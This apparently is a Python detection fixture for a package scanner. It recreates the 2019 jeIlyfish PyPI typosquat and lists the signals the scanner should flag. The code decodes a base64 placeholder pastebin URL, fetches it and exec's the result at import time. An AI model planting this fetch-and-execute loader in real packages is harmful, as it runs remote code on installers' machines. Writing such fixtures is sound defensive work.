# jeIlyfish@0.7.1 (Dec 2019). Capital `I` typosquat of `jellyfish` —
# in most monospace fonts the `I` looks identical to lowercase `l`.
# The package was live on PyPI for nearly a year before takedown.
# Companion: python3-dateutil typosquat in the same campaign.
# Public write-up:
# https://github.com/dateutil/dateutil/issues/984
#
# The malicious payload imported a base64'd URL, fetched it, and
# exec'd the result — exactly the shape our exec(urlopen) detector
# catches in pyscan + the obfuscated-payload heuristic.
#
# Detection target:
#   - typosquat-risk  (jeIlyfish vs jellyfish, Levenshtein-1 in
#                      the case-sensitive comparison; jellyfish is
#                      in our PyPI top-list)
#   - dynamic-eval    (exec)
#   - net-egress      (urllib.request.urlopen)
#   - base64-decode   (base64.b64decode of URL)

import base64
import urllib.request


def _harvest():
    # Fetch the second-stage from a base64-encoded URL.
    url = base64.b64decode(b"aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L1hYWA==").decode()
    payload = urllib.request.urlopen(url).read()
    exec(payload)


_harvest()
